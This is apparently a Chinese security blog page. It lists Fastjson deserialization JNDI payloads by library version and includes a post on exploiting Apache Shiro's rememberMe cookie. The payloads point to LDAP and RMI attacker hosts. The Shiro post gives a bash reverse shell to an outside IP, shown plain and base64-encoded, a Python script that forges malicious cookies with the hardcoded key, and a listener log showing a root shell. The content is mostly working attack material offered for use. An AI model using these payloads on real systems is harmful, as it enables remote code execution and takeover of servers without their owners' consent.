<span class="o">{</span><span class="s2">"rand8"</span>:Set<span class="se">\[</span><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span>

<span class="o">{</span><span class="s2">"rand9"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.net.URL"</span>,<span class="s2">"val"</span>:<span class="s2">"http://dnslog"</span><span class="o">}</span>


<span class="o">{</span><span class="s2">"@type"</span>: <span class="s2">"java.lang.AutoCloseable"</span>
</code></pre></div></div>

<hr />

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}</span>

<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span>
</code></pre></div></div>

<hr />

<ul>
  <li>1.2.41</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"Lcom.sun.rowset.JdbcRowSetImpl;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>, <span class="s2">"autoCommit"</span>:true<span class="o">}</span>
// 直接加 <span class="o">[</span> 是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType<span class="o">()</span>可以获得数组元素，即com.sun.rowset.JdbcRowSetImpl对象
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="o">[{</span><span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true]<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.42</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>, <span class="s2">"autoCommit"</span>:true<span class="o">}</span>
//原来在41版本的[还能用
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="o">[{</span><span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true]<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.43</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>:<span class="o">{</span><span class="s2">"data_source"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>
<ul>
  <li>1.2.45</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>:<span class="o">{</span><span class="s2">"data_source"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>
<ul>
  <li>1.2.47</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}}</span>

<span class="o">{</span><span class="s2">"a"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"java.lang.Class"</span>,<span class="s2">"val"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span><span class="o">}</span>,<span class="s2">"b"</span>:<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://47.52.233.92:9999/expUseful"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}}}</span>

</code></pre></div></div>
<ul>
  <li>1.2.60</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.commons.configuration.JNDIConfiguration"</span>,<span class="s2">"prefix"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span>,<span class="s2">"xaDataSourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>oracle.jdbc.connector.OracleManagedConnectionFactory<span class="se">\"</span>,<span class="se">\"</span>xaDataSourceName<span class="se">\"</span>:<span class="se">\"</span>rmi://10.10.20.166:1099/ExportObject<span class="se">\"</span><span class="o">}</span>
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>ldap://10.10.20.166:1389/ExportObject<span class="se">\"</span><span class="o">}</span>


<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration2.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span><span class="s2">"
</span></code></pre></div></div>
<ul>
  <li>1.2.62</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.xbean.propertyeditor.JndiConverter"</span>,<span class="s2">"AsText"</span>:<span class="s2">"rmi://127.0.0.1:1099/exploit"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>1.2.66</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.shiro.jndi.JndiObjectFactory"</span>,<span class="s2">"resourceName"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"br.com.anteros.dbcp.AnterosDBCPConfig"</span>,<span class="s2">"metricRegistry"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"</span>,<span class="s2">"jndiNames"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}</span>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig"</span>,<span class="s2">"properties"</span>: <span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"
java.util.Properties"</span>,<span class="s2">"UserTransaction"</span>:<span class="s2">"ldap://47.52.233.92:9999/expUseful"</span><span class="o">}}</span>
</code></pre></div></div>

<ul>
  <li>RMI</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"LLcom.sun.rowset.RowSetImpl;;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span> 1.2.42
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"[com.sun.rowset.RowSetImpl"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span> 1.2.25v1.2.43
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>,<span class="s2">"properties"</span>：<span class="s2">"data_source"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span><span class="o">}}</span> 1.2.25
<span class="o">{</span><span class="s2">"@type"</span>:<span class="s2">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="s2">"dataSourceName"</span>:<span class="s2">"rmi://localhost:1099/Exploit"</span>,<span class="s2">"autoCommit"</span>:true<span class="o">}</span>
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>com.zaxxer.hikari.HikariConfig<span class="se">\"</span>,<span class="se">\"</span>metricRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span>1.2.60
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span> 1.2.60
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.commons.configuration2.JNDIConfiguration<span class="se">\"</span>,<span class="se">\"</span>prefix<span class="se">\"</span>:<span class="se">\"</span>rmi://127.0.0.1:1099/Exploit<span class="se">\"</span><span class="o">}</span> 1.2.61
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>org.apache.xbean.propertyeditor.JndiConverter<span class="se">\"</span>,<span class="se">\"</span>asText<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span>  1.2.62
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>br.com.anteros.dbcp.AnterosDBCPConfig<span class="se">\"</span>,<span class="se">\"</span>healthCheckRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span> AnterosDBCPConfig
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>br.com.anteros.dbcp.AnterosDBCPConfig<span class="se">\"</span>,<span class="se">\"</span>metricRegistry<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}</span> AnterosDBCPConfig
<span class="o">{</span><span class="se">\"</span>@type<span class="se">\"</span>:<span class="se">\"</span>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig<span class="se">\"</span>,<span class="se">\"</span>properties<span class="se">\"</span>:<span class="o">{</span><span class="se">\"</span>UserTransaction<span class="se">\"</span>:<span class="se">\"</span>rmi://localhost:1099/Exploit<span class="se">\"</span><span class="o">}}</span> JtaTransactionConfig
</code></pre></div></div>


          <p><a href="/blog/2020/fastjson/UNdeser/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/fastjson/UNdeser/"><h3 class="ctitle">「Shiro」:Apache-shiro框架利用整理</h3></a>
          <p><csmall>May 18, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <blockquote>
  <p>漏洞特征：shiro反序列化的特征：1、在返回包的Set-Cookie的值为「rememberMe=deleteMe」2、Apache Shiro版本&lt;= 1.2.4
现在很多j2ee开发都会采用shiro框架来做一些权限控制，框架的优势是出来了，当然就存在劣势。shiro是我在参加工作后才会慢慢去接触到，从一开始的代审，再到黑盒渗透，再到前一段时间刚结束的HW行动。
第一小结，是我自己在实践中的一些理解和经历，希望能够记录下来；第二小结是在学习中在网上的一些学习过程，当时也记录下来了，故此分为两个小结。</p>
</blockquote>

<h3 id="验证">验证</h3>
<p>在上面的简述中，可以来进行shiro框架的判断，同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：
用到的是<a href="http://www.svenbeast.com/post/tskRKJIPg/">Shiroscan</a>脚本，开源在github上，用法就不多赘述。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 shiro_rce.py https://shiro.vuln.ip/login.html <span class="s2">"ping x.dnslog.cn"</span>
 ____  _     _          ____                  
/ ___|| |__ <span class="o">(</span>_<span class="o">)</span>_ __ ___/ ___|  ___ __ _ _ __  
<span class="se">\_</span>__ <span class="se">\|</span> <span class="s1">'_ \| | '</span>__/ _ <span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文

Welcome To Shiro反序列化 RCE ! 
[*]  开始检测模块 Class1:CommonsBeanutils1
</span></code></pre></div></div>
<p>然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">35</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">dnslog</span><span class="p">.</span><span class="nx">cn</span>    <span class="nx">shiro</span><span class="p">.</span><span class="nx">vuln</span><span class="p">.</span><span class="nx">ip</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span> <span class="mi">16</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">52</span>
</code></pre></div></div>
<h4 id="不服气">不服气</h4>
<p>当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-
<a href="https://www.bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">作者博客</a></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">python</span> <span class="nx">shiro_exp</span><span class="p">.</span><span class="nx">py</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//shiro.vuln.ip/login.html</span>
<span class="k">try</span> <span class="nx">CipherKey</span> <span class="p">:</span><span class="mi">4</span><span class="nx">AvVhmFLUs0KTA3Kprsdag</span><span class="o">==</span>
<span class="nx">generator</span> <span class="nx">payload</span> <span class="nx">done</span><span class="p">.</span>
<span class="nx">send</span> <span class="nx">payload</span> <span class="nx">ok</span><span class="p">.</span>
<span class="nx">checking</span><span class="p">.....</span>
<span class="nx">checking</span><span class="p">.....</span>
<span class="nx">checking</span><span class="p">.....</span>
<span class="nx">checking</span><span class="p">.....</span>
<span class="nx">vulnerable</span><span class="p">:</span><span class="kc">true</span> <span class="nx">url</span><span class="p">:</span><span class="nx">https</span><span class="p">:</span><span class="c1">//shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==</span>
</code></pre></div></div>
<p>当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。</p>

<h2 id="getshell">getshell</h2>
<p>通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell
一般反弹shell的执行代码<code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/47.52.233.92/11111 0&gt;&amp;1</code>，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；
转成base64编码-&gt;<code class="language-plaintext highlighter-rouge">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}</code>；像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多
来源：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">我是转换网址:-)</a>
监听端口等待shell回连（我这里的样例是docker环境）</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">11111</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">11111</span><span class="p">)</span>
<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">59.110</span><span class="p">.</span><span class="mf">152.168</span> <span class="mi">47274</span> <span class="nx">received</span><span class="o">!</span>
<span class="nx">bash</span><span class="p">:</span> <span class="nx">cannot</span> <span class="kd">set</span> <span class="nx">terminal</span> <span class="nx">process</span> <span class="nx">group</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="nx">Inappropriate</span> <span class="nx">ioctl</span> <span class="k">for</span> <span class="nx">device</span>
<span class="nx">bash</span><span class="p">:</span> <span class="nx">no</span> <span class="nx">job</span> <span class="nx">control</span> <span class="k">in</span> <span class="k">this</span> <span class="nx">shell</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">6d5a7848dbef</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">id</span>
<span class="nx">id</span>
<span class="nx">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="学习">学习</h3>
<h4 id="工具">工具</h4>
<p>使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">git</span> <span class="nx">clone</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/frohoff/ysoserial.git</span>
<span class="nx">cd</span> <span class="nx">ysoserial</span>
<span class="nx">mvn</span> <span class="kr">package</span> <span class="o">-</span><span class="nx">D</span> <span class="nx">skipTests</span>
</code></pre></div></div>
<h4 id="how-to-poc">how-to-poc</h4>
<p>使用poc代码获得对应的rememberMe的cookie值。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span> <span class="o">-*-</span> <span class="nx">coding</span><span class="p">:</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span> <span class="o">-*-</span>
<span class="k">import</span> <span class="nx">sys</span>
<span class="k">import</span> <span class="nx">uuid</span>
<span class="k">import</span> <span class="nx">base64</span>
<span class="k">import</span> <span class="nx">subprocess</span>
<span class="k">from</span> <span class="nx">Crypto</span><span class="p">.</span><span class="nx">Cipher</span> <span class="k">import</span> <span class="nx">AES</span>

<span class="nx">def</span> <span class="nx">encode_rememberme</span><span class="p">(</span><span class="nx">command</span><span class="p">):</span>
    <span class="nx">popen</span> <span class="o">=</span> <span class="nx">subprocess</span><span class="p">.</span><span class="nx">Popen</span><span class="p">([</span><span class="dl">'</span><span class="s1">java</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">-jar</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ysoserial-0.0.6-SNAPSHOT-all.jar</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">JRMPClient</span><span class="dl">'</span><span class="p">,</span> <span class="nx">command</span><span class="p">],</span> <span class="nx">stdout</span><span class="o">=</span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">PIPE</span><span class="p">)</span>
    <span class="nx">BS</span> <span class="o">=</span> <span class="nx">AES</span><span class="p">.</span><span class="nx">block_size</span>
    <span class="nx">pad</span> <span class="o">=</span> <span class="nx">lambda</span> <span class="nx">s</span><span class="p">:</span> <span class="nx">s</span> <span class="o">+</span> <span class="p">((</span><span class="nx">BS</span> <span class="o">-</span> <span class="nx">len</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">%</span> <span class="nx">BS</span><span class="p">)</span> <span class="o">*</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">BS</span> <span class="o">-</span> <span class="nx">len</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">%</span> <span class="nx">BS</span><span class="p">)).</span><span class="nx">encode</span><span class="p">()</span>
    <span class="nx">key</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">b64decode</span><span class="p">(</span><span class="dl">"</span><span class="s2">kPH+bIxk5D2deZiIxcaaaA==</span><span class="dl">"</span><span class="p">)</span>
    <span class="nx">iv</span> <span class="o">=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nx">uuid4</span><span class="p">().</span><span class="nx">bytes</span>
    <span class="nx">encryptor</span> <span class="o">=</span> <span class="nx">AES</span><span class="p">.</span><span class="k">new</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="nx">AES</span><span class="p">.</span><span class="nx">MODE_CBC</span><span class="p">,</span> <span class="nx">iv</span><span class="p">)</span>
    <span class="nx">file_body</span> <span class="o">=</span> <span class="nx">pad</span><span class="p">(</span><span class="nx">popen</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">read</span><span class="p">())</span>
    <span class="nx">base64_ciphertext</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">b64encode</span><span class="p">(</span><span class="nx">iv</span> <span class="o">+</span> <span class="nx">encryptor</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">file_body</span><span class="p">))</span>
    <span class="k">return</span> <span class="nx">base64_ciphertext</span>

<span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">__main__</span><span class="dl">'</span><span class="p">:</span>
    <span class="nx">payload</span> <span class="o">=</span> <span class="nx">encode_rememberme</span><span class="p">(</span><span class="nx">sys</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>    
<span class="nx">print</span> <span class="dl">"</span><span class="s2">rememberMe={0}</span><span class="dl">"</span><span class="p">.</span><span class="nx">format</span><span class="p">(</span><span class="nx">payload</span><span class="p">.</span><span class="nx">decode</span><span class="p">())</span>
</code></pre></div></div>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">D</span><span class="p">:</span><span class="err">\</span><span class="nx">bin4xin</span><span class="err">\</span><span class="nx">code</span><span class="err">\</span><span class="nx">shiro</span><span class="err">\</span><span class="nx">shrio</span><span class="o">-</span><span class="nx">poc</span><span class="err">\</span><span class="nx">ysoserial</span><span class="err">\</span><span class="nx">target</span><span class="o">&gt;</span> <span class="nx">python</span> <span class="p">.</span><span class="err">\</span><span class="nx">shrio</span><span class="o">-</span><span class="nx">poc</span><span class="p">.</span><span class="nx">py</span> <span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span><span class="p">:</span><span class="mi">6666</span>
<span class="nx">rememberMe</span><span class="o">=</span><span class="nx">W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ</span><span class="o">+</span><span class="nx">dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi</span><span class="o">/</span><span class="nx">NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2</span><span class="o">+</span><span class="nx">SL7hy3YNq9cpPWm5S8o</span><span class="o">+</span><span class="nx">nJpa6IyI9cZ</span><span class="o">+</span><span class="nx">n7a</span><span class="o">+</span><span class="mi">6</span><span class="nx">hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn</span><span class="o">/</span><span class="nx">z9t</span><span class="o">/</span><span class="nx">KWcSeTWE</span><span class="o">+</span><span class="nx">Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF</span><span class="o">+</span><span class="nx">Y5eB4MaNTw</span><span class="o">==</span>
</code></pre></div></div>

<p>抓包，前台登录拦包，勾选<code class="language-plaintext highlighter-rouge">Remember Me</code>，截获数据包，替换cookie构造数据包：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span><span class="nx">doLogin</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span> <span class="nx">underattack</span><span class="o">-</span><span class="nx">host</span><span class="p">:</span><span class="mi">8080</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">55</span>
<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span>
<span class="nx">Origin</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//underattack-host:8080</span>
<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">DNT</span><span class="p">:</span> <span class="mi">1</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">81.0</span><span class="p">.</span><span class="mf">4044.138</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
